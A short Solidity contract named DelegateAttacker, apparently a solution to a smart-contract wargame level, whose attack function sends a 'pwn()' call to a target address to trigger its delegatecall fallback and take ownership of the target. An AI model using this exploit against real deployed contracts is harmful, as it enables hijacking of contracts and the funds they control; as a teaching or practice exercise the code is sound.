// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract DelegateAttacker {

    constructor() {}

    function attack(address target) public {
        (bool success, ) = target.call(
            abi.encodeWithSignature("pwn()")
        );
        require(success);
    }
}